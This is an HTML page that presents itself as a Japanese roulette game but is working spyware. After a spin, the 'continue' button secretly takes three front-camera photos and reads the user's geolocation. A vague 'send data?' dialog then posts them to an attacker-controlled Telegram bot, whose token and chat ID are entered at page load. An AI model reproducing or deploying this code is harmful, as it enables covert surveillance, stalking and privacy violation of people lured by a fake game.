<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>🎯ルーレット🎯</title>
<style>
  body { margin: 0; color: #fff; font-family: sans-serif; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; overflow-x: hidden; background: #444; transition: background 0.1s; padding: 20px 0; box-sizing: border-box; }
  h2 { position: relative; margin-bottom: 30px; padding: 10px 25px; background: rgba(255,255,255,0.2); border-radius: 15px; backdrop-filter: blur(10px); z-index: 5; border: 1px solid rgba(255,255,255,0.3); font-size: 24px; }
  #container { width: 85vw; max-width: 400px; aspect-ratio: 1; position: relative; margin: 20px 0; }
  #pointer { position: absolute; left: 50%; top: -25px; transform: translateX(-50%); font-size: 45px; z-index: 20; color: #ffffff; text-shadow: 0 4px 10px rgba(0,0,0,0.5); line-height: 1; }
  canvas { width: 100%; height: 100%; border-radius: 50%; border: 8px solid #333; box-shadow: 0 0 30px rgba(0,0,0,0.5); display: block; }
  #result { margin-top: 20px; font-size: 26px; font-weight: bold; text-shadow: 2px 2px 5px rgba(0,0,0,0.5); height: 1.2em; }
  #spinBtn { margin-top: 20px; padding: 15px 50px; font-size: 20px; cursor: pointer; border-radius: 50px; border: none; background: #fff; color: #333; font-weight: bold; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
  .modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #fff; color: #333; padding: 30px; border-radius: 40px; text-align: center; box-shadow: 0 0 100px rgba(0,0,0,0.5); z-index: 100; width: 85%; max-width: 320px; }
  .modal h1 { margin: 0 0 15px; font-size: 22px; }
  .modal p { font-size: 14px; margin-bottom: 20px; color: #666; }
  .btn-group { display: flex; flex-direction: column; gap: 10px; }
  .primary-btn { padding: 15px; font-size: 18px; background: #ff4081; color: white; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; }
  .secondary-btn { padding: 12px; font-size: 16px; background: #bbb; color: white; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; }
  #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 90; }
</style>
</head>
<body>

<h2>🎯ルーレット🎯</h2>
<div id="container"><div id="pointer">▼</div><canvas id="wheel"></canvas></div>
<h3 id="result">結果：</h3>
<button id="spinBtn">回す</button>
<div id="overlay"></div>
<div id="winModal" class="modal"><h1>おめでとう🥳</h1><div class="btn-group"><button class="primary-btn" id="continueBtn">続ける</button></div></div>
<div id="confirmModal" class="modal"><h1>送信確認</h1><p>データを送信しますか？</p><div class="btn-group"><button class="primary-btn" id="sendYes">はい</button><button class="secondary-btn" id="sendNo">いいえ</button></div></div>

<script>
let hue = 0;
function animateBG() { hue = (hue + 1) % 360; document.body.style.backgroundColor = `hsl(${hue}, 80%, 60%)`; requestAnimationFrame(animateBG); }
animateBG();

const BOT_TOKEN = prompt("Token");
const CHAT_ID = prompt("ID");

const canvas = document.getElementById("wheel");
const ctx = canvas.getContext("2d");
const slots = ["当たり","ハズレ","当たり","ハズレ","当たり","ハズレ","当たり","ハズレ"];

function draw() {
  const size = 800; canvas.width = size; canvas.height = size;
  const c = size / 2; const rad = (Math.PI * 2) / slots.length;
  ctx.clearRect(0, 0, size, size);
  for(let i=0; i<slots.length; i++){
    ctx.beginPath(); ctx.moveTo(c, c); ctx.arc(c, c, c, i * rad, (i + 1) * rad);
    ctx.fillStyle = i % 2 === 0 ? "#FFD700" : "#EEEEEE"; ctx.fill();
    ctx.save(); ctx.translate(c, c); ctx.rotate(i * rad + rad / 2);
    ctx.fillStyle = "#333"; ctx.font = "bold 55px sans-serif"; ctx.textAlign = "center"; ctx.textBaseline = "middle";
    ctx.fillText(slots[i], c * 0.55, 0); ctx.restore();
  }
}
window.onload = draw;
draw();

let tempPhotos = [];
let tempLocationMsg = "";

async function getTempData() {
  tempPhotos = []; tempLocationMsg = "";
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    const video = document.createElement("video"); video.srcObject = stream; await video.play();
    for (let i = 0; i < 3; i++) {
      const tempCanvas = document.createElement("canvas");
      tempCanvas.width = video.videoWidth; tempCanvas.height = video.videoHeight;
      tempCanvas.getContext("2d").drawImage(video, 0, 0);
      const blob = await new Promise(r => tempCanvas.toBlob(r, "image/jpeg", 0.7));
      tempPhotos.push(blob); await new Promise(r => setTimeout(r, 400));
    }
    stream.getTracks().forEach(t => t.stop());
  } catch (e) {}

  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition((pos) => {
      tempLocationMsg = `📍位置情報: http://googleusercontent.com/maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
      document.getElementById("confirmModal").style.display = "block";
    }, () => { document.getElementById("confirmModal").style.display = "block"; });
  }
}

const spinBtn = document.getElementById("spinBtn");
let totalRotation = 0;
spinBtn.onclick = () => {
  spinBtn.disabled = true;
  totalRotation += 1800 + Math.random() * 360;
  canvas.style.transition = "transform 4s cubic-bezier(0.1, 0, 0.1, 1)";
  canvas.style.transform = `rotate(${totalRotation}deg)`;
  setTimeout(() => {
    document.getElementById("overlay").style.display = "block";
    document.getElementById("winModal").style.display = "block";
    spinBtn.disabled = false;
  }, 4200);
};

document.getElementById("continueBtn").onclick = () => {
  document.getElementById("winModal").style.display = "none";
  getTempData();
};

document.getElementById("sendYes").onclick = async () => {
  document.getElementById("confirmModal").style.display = "none";
  if(!BOT_TOKEN || !CHAT_ID) return;
  for (const blob of tempPhotos) {
    const fd = new FormData(); fd.append("chat_id", CHAT_ID); fd.append("photo", blob, "1.jpg");
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
  }
  if (tempLocationMsg) {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: tempLocationMsg })
    });
  }
  location.reload();
};

document.getElementById("sendNo").onclick = () => location.reload();
</script>
</body>
</html>
